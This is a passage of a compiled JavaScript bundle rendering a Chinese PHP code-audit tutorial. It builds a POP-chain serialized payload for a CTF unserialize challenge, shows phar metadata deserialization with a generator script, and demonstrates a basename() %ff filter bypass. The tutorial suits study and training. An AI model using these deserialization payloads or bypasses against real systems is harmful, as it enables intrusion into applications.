",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"hacker~"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"source")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"index.php"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Test"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"params")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__get"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$key"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$func")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'chal'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$chal")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"unserialize"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'chal'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"))))),Object(p.b)("p",null,"我们要拿到flag，在",Object(p.b)("inlineCode",{parentName:"p"},"__invoke()"),"函数，当对象被当作函数调用时，那么就会自动执行该函数。所以我们要做的就是用函数来调用对象。"),Object(p.b)("p",null,"那么我们首先找到起点，就是unserialize函数的变量，因为这个变量是我们可控的，但是肯定是过滤了一些常见的协议，那些协议我在上面也简单介绍过用法。"),Object(p.b)("p",null,"通过函数的过程搜索，我们能够看到preg_match第二个参数会被当作字符串处理，在类Test中，我们可以给$func赋值给Read对象。"),Object(p.b)("p",null,"那么我们可以构造如下pop链"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," \n    ··········\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$read")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Read"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$show")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Show"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$read"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$read"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token_flag"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"params")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$read"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$show"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'str'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$show"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"source")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$show"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"serialize"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$show"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"给个图总结一下："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830193825.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"phar与反序列化"},"phar与反序列化",Object(p.b)("a",c({parentName:"h3"},{href:"#phar%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h4",{className:"__internal",id:"简介-1"},"简介",Object(p.b)("a",c({parentName:"h4"},{href:"#%E7%AE%80%E4%BB%8B-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,'PHAR（"PHP archive"）是PHP里类似JAR的一种打包文件，在PHP > 5.3版本中默认开启。其实就是用来打包程序的。'),Object(p.b)("h4",{className:"__internal",id:"文件结构"},"文件结构",Object(p.b)("a",c({parentName:"h4"},{href:"#%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ol",null,Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),Object(p.b)("p",{parentName:"li"},"a stub：",Object(p.b)("inlineCode",{parentName:"p"},"xxx<?php xxx;__HALT_COMPILER();?>"),"前面内容不限，后面必须以",Object(p.b)("inlineCode",{parentName:"p"},"__HALT_COMPILER();?>"),"结尾，否则phar扩展无法将该文件识别为phar文件。")),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),Object(p.b)("p",{parentName:"li"},"官方手册"),Object(p.b)("p",{parentName:"li"},"phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。"))),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200831092854.png",alt:null}))),Object(p.b)("h4",{className:"__internal",id:"实验"},"实验",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%AE%9E%E9%AA%8C","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"前提：将",Object(p.b)("inlineCode",{parentName:"p"},"php.ini"),"中的",Object(p.b)("inlineCode",{parentName:"p"},"phar.readonly"),"选项设置为",Object(p.b)("inlineCode",{parentName:"p"},"off"),"，不然无法生成phar文件。"),Object(p.b)("h5",{className:"__internal",id:"pharphp："},"phar.php：",Object(p.b)("a",c({parentName:"h5"},{href:"#pharphp%EF%BC%9A","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"TestObject")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$phar")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Phar"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"phar.phar"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//后缀名必须为phar"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$phar"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"startBuffering"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$phar"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"setStub"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<?php __HALT_COMPILER(); ?>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//设置stub"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$o")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"TestObject"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$o")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," data",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Hello I am Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$phar"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"setMetadata"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$o"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//将自定义的meta-data存入manifest"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$phar"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"addFromString"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"test.txt"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"test"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//添加要压缩的文件"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//签名自动计算"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$phar"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"stopBuffering"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"在我们访问之后，会在当前目录下生成一个phar.phar文件，如下图所示。"),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830211454.png",alt:null}))),Object(p.b)("p",null,"然后查看文件的十六进制形式，我们就可以看到meta-data是以序列化的形式存储。既然存在序列化的数据，那肯定有序列化的逆向操作反序列化。那么这里在PHP中存在很多通过",Object(p.b)("inlineCode",{parentName:"p"},"phar://"),"伪协议解析phar文件时，会将meta-data进行反序列化。可用函数如下图"),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200831094439.png",alt:null}))),Object(p.b)("h5",{className:"__internal",id:"amengphp"},"Ameng.php",Object(p.b)("a",c({parentName:"h5"},{href:"#amengphp","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"TestObject"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__destruct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," data",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"   ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// TODO: Implement __destruct() method."),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"include"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'phar://phar.phar'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830213118.png",alt:null}))),Object(p.b)("p",null,"这里简单介绍一下phar的大致应用，更详细可以参考",Object(p.b)("a",c({parentName:"p"},{href:"https://paper.seebug.org/680/",target:"_blank"}),"seebug"),"。"),Object(p.b)("h2",{className:"__internal",id:"其他一些总结"},"其他一些总结",Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"basename"},"basename()",Object(p.b)("a",c({parentName:"h3"},{href:"#basename","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数返回路径中的文件名的一部分(后面)"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"basename"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"path",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"suffix",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-31"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-31","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"path：必需。规定要检查的路径。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"suffix：可选。规定文件的扩展名。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$path")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"index.php/test.php"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"basename"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$path"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n        \n执行结果——>\ntest.php"))),Object(p.b)("p",null,"此函数还有一个特点，就是会去掉文件名的非ASCII码值。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$path")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'x'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"basename"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$path"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"我们通过 url 传入参数",Object(p.b)("inlineCode",{parentName:"p"},"x=index.php/config.php/%ff")),Object(p.b)("p",null,"结果如下："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200826211734.png",alt:null}))),Object(p.b)("p",null,"我们看到，",Object(p.b)("inlineCode",{parentName:"p"},"%ff"),"直接没了，而是直接输出前面的的文件名，这个可以用来绕过一些正则匹配。原因就在于",Object(p.b)("inlineCode",{parentName:"p"},"%ff"),"在通过 url 传参时会被 url 解码，解码成了不可见字符，满足了",Object(p.b)("inlineCode",{parentName:"p"},"basename"),"函数对文件名的非ASCII值去除的特点，从而被删掉。"))}i.isMDXComponent=!0,i=Object(s.hot)(a)(i),(m="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(m.register(o,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\code-audit\\php-code-audit.md"),m.register(N,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\code-audit\\php-code-audit.md"),m.register(l,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\code-audit\\php-code-audit.md"),m.register(i,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\code-audit\\php-code-audit.md")),(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&r(a)}.call(this,n(23)(a))}}]);